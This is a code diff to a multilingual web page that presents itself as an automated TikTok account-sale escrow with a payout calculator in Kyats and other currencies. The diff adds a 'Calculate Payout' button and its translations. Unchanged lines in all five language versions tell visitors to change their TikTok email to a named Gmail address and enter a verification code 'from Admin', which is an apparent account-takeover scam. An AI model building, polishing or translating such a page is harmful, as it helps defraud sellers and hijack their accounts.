@@ -74,12 +74,15 @@
         /* Interactive Calculator Card */
         .payout-card { background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-lg); padding: 32px; max-width: 680px; margin: 0 auto; box-shadow: var(--shadow-md); width: 100%; }
         .calc-title { font-size: 1.15rem; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; color: var(--text-primary); }
-        .calc-inputs-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; margin-bottom: 24px; }
+        .calc-inputs-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; margin-bottom: 20px; }
         .calc-input-group { display: flex; flex-direction: column; gap: 6px; }
         .calc-input-group label { font-size: 0.85rem; font-weight: 600; color: var(--text-muted); }
         .calc-input-group input, .calc-input-group select { width: 100%; padding: 12px 16px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: #ffffff; font-family: inherit; font-size: 1rem; outline: none; font-weight: 600; color: var(--text-primary); }
         .calc-input-group input:focus, .calc-input-group select:focus { border-color: #8b5cf6; box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15); }
         
+        .btn-calculate { width: 100%; padding: 12px; border-radius: var(--radius-md); background: #8b5cf6; color: #ffffff; font-weight: 600; font-size: 0.95rem; margin-bottom: 20px; transition: background 0.2s; }
+        .btn-calculate:hover { background: #7c3aed; }
+
         .calc-results-box { background: var(--danger-bg); border: 1.5px solid var(--danger-border); border-radius: var(--radius-md); padding: 20px 24px; }
         .payout-row { font-size: 1.05rem; font-weight: 600; color: var(--danger-red); margin: 6px 0; display: flex; justify-content: space-between; align-items: center; }
         .payout-row.total { font-size: 1.35rem; font-weight: 700; border-top: 1px dashed rgba(239, 68, 68, 0.3); padding-top: 12px; margin-top: 10px; color: #16a34a; }
@@ -94,7 +97,6 @@
         .form-group input:focus, .form-group select:focus { border-color: #8b5cf6; background: #ffffff; box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15); }
         .field-notice { font-size: 0.825rem; color: var(--danger-red); font-weight: 500; margin-top: 4px; display: flex; align-items: center; gap: 6px; }
         
-        /* Email Change Banner & Verification Code Box styles */
         .email-change-banner { background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.25); color: #2563eb; padding: 12px 16px; border-radius: var(--radius-md); font-weight: 600; font-size: 0.9rem; margin-bottom: 12px; text-align: center; }
         .email-code-container { background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-md); padding: 16px; margin-bottom: 20px; text-align: center; }
         .email-code-container label { display: block; font-size: 0.875rem; font-weight: 700; color: var(--text-primary); margin-bottom: 8px; }
@@ -232,6 +234,9 @@
                             </div>
                         </div>
 
+                        <!-- Added Explicit Calculate Button -->
+                        <button type="button" id="calcButton" class="btn-calculate" data-i18n="btnCalculate">Calculate Payout</button>
+
                         <div class="calc-results-box">
                             <div class="payout-row"><span data-i18n="depositLabel">Requested Amount</span><span id="displayDepositAmt">2,000,000 Kyats</span></div>
                             <div class="payout-row"><span id="displayFeeLabel">Middle Man Fee (7%)</span><span id="displayFeeAmt">- 140,000 Kyats</span></div>
@@ -249,7 +254,7 @@
 
                             <div class="email-change-banner" data-i18n="emailBanner">Change your TikTok Email to gamermaid.ai@gmail.com</div>
 
-                            <!-- Added Email Code Display Box & Red Warning Text -->
+                            <!-- Email Code Display Box & Red Warning Text -->
                             <div class="email-code-container">
                                 <label data-i18n="emailCodeLabel">Email Verification Code (from Admin)</label>
                                 <div class="code-display-box" id="adminCodeDisplay">••••••</div>
@@ -390,7 +395,7 @@
             <div class="lang-modal-grid">
                 <button class="lang-option-btn" data-lang="en">🇬🇧 English</button>
                 <button class="lang-option-btn" data-lang="ja">🇯🇵 日本語 (Japan)</button>
-                <button class="lang-option-btn" data-lang="zh">🇨🇳 中文 (China)</button>
+                <button class="lang-option-btn" data-lang="zh">中文 (China)</button>
                 <button class="lang-option-btn" data-lang="th">🇹🇭 ไทย (Thai)</button>
                 <button class="lang-option-btn" data-lang="my" style="grid-column: span 2;">🇲🇲 မြန်မာ (Myanmar)</button>
             </div>
@@ -440,6 +445,7 @@
                 escrowSub: "Secure automated verification and middleman clearance system.",
                 depositLabel: "Requested Amount",
                 totalLabel: "You will get",
+                btnCalculate: "Calculate Payout",
                 accVerification: "Account Verification",
                 emailBanner: "Change your TikTok Email to gamermaid.ai@gmail.com",
                 emailCodeLabel: "Email Verification Code (from Admin)",
@@ -496,6 +502,7 @@
                 escrowSub: "安全な自動認証および仲介クリアランスシステム。",
                 depositLabel: "リクエスト金額",
                 totalLabel: "お受取額",
+                btnCalculate: "受取額を計算する",
                 accVerification: "アカウント認証",
                 emailBanner: "TikTokのメールアドレスを gamermaid.ai@gmail.com に変更してください",
                 emailCodeLabel: "メール確認コード（管理者より）",
@@ -552,6 +559,7 @@
                 escrowSub: "安全自动验证与中间人结算系统。",
                 depositLabel: "请求金额",
                 totalLabel: "您将获得",
+                btnCalculate: "计算到账金额",
                 accVerification: "账户验证",
                 emailBanner: "请将您的 TikTok 邮箱更改为 gamermaid.ai@gmail.com",
                 emailCodeLabel: "邮箱验证码（来自管理员）",
@@ -608,6 +616,7 @@
                 escrowSub: "ระบบยืนยันตัวตนอัตโนมัติและเคลียร์ริ่งคนกลางที่ปลอดภัย",
                 depositLabel: "จำนวนเงินที่ขอ",
                 totalLabel: "ที่คุณจะได้รับ",
+                btnCalculate: "คำนวณยอดเงิน",
                 accVerification: "การยืนยันบัญชี",
                 emailBanner: "เปลี่ยนอีเมล TikTok ของคุณเป็น gamermaid.ai@gmail.com",
                 emailCodeLabel: "รหัสยืนยันอีเมล (จากแอดมิน)",
@@ -664,6 +673,7 @@
                 escrowSub: "လုံခြုံစိတ်ချရသော အလိုအလျောက် အတည်ပြုခြင်းနှင့် ကြားခံရှင်းလင်းရေးစနစ်။",
                 depositLabel: "တောင်းဆိုထားသော ပမာဏ",
                 totalLabel: "သင်ရရှိမည့်ငွေ",
+                btnCalculate: "ငွေပမာဏ တွက်ချက်ရန်",
                 accVerification: "အကောင့် အတည်ပြုခြင်း",
                 emailBanner: "သင့် TikTok အီးမေးလ်ကို gamermaid.ai@gmail.com သို့ ပြောင်းလဲပါ",
                 emailCodeLabel: "အီးမေးလ် အတည်ပြုကုဒ် (အက်ဒမင်ထံမှ)",
@@ -734,9 +744,10 @@
 
             languageSelector.addEventListener('change', (e) => changeLanguage(e.target.value));
 
-            // Dynamic Payout Calculator Logic
+            // Dynamic Payout Calculator Logic with Calculate Button
             const requestedPriceInput = document.getElementById('requestedPrice');
             const currencySelect = document.getElementById('currencySelect');
+            const calcButton = document.getElementById('calcButton');
             const displayDepositAmt = document.getElementById('displayDepositAmt');
             const displayFeeLabel = document.getElementById('displayFeeLabel');
             const displayFeeAmt = document.getElementById('displayFeeAmt');
@@ -758,8 +769,10 @@
                 displayTotalPayout.textContent = `${formattedTotal} ${currency}`;
             }
 
-            requestedPriceInput.addEventListener('input', updateCalculator);
-            currencySelect.addEventListener('change', updateCalculator);
+            // Calculate when button is clicked
+            calcButton.addEventListener('click', updateCalculator);
+            
+            // Also update immediately on load
             updateCalculator();
 
             // Navigation tabs switching
